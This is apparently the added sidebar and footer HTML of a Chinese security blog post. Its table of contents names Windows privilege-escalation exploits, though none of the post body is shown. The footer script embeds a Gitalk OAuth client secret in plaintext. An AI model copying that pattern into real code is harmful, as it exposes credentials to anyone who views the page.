+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-Exploit-suggester"><span class="nav-number">1.</span> <span class="nav-text">Windows-Exploit-suggester</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用法"><span class="nav-number">1.1.</span> <span class="nav-text">用法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-ClientCopyImage-Win32k-Exploit"><span class="nav-number">3.</span> <span class="nav-text">Windows ClientCopyImage Win32k Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-TrackPopupMenu-Win32k-NULL指针解引用"><span class="nav-number">4.</span> <span class="nav-text">Windows TrackPopupMenu Win32k NULL指针解引用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过KiTrap0D提升Windows权限"><span class="nav-number">5.</span> <span class="nav-text">通过KiTrap0D提升Windows权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-Scheduler-XML提权"><span class="nav-number">6.</span> <span class="nav-text">Task Scheduler XML提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MS16-016-mrxdav-sys-WebDav本地提权"><span class="nav-number">7.</span> <span class="nav-text">MS16-016 mrxdav.sys WebDav本地提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EPATHOBJ-pprFlattenRec本地提权"><span class="nav-number">8.</span> <span class="nav-text">EPATHOBJ::pprFlattenRec本地提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MS13-053-NTUserMessageCall-Win32k内核池溢出"><span class="nav-number">9.</span> <span class="nav-text">MS13-053 : NTUserMessageCall Win32k内核池溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MS16-032-Secondary-Logon-Handle提权"><span class="nav-number">10.</span> <span class="nav-text">MS16-032 Secondary Logon Handle提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RottenPotato"><span class="nav-number">11.</span> <span class="nav-text">RottenPotato</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
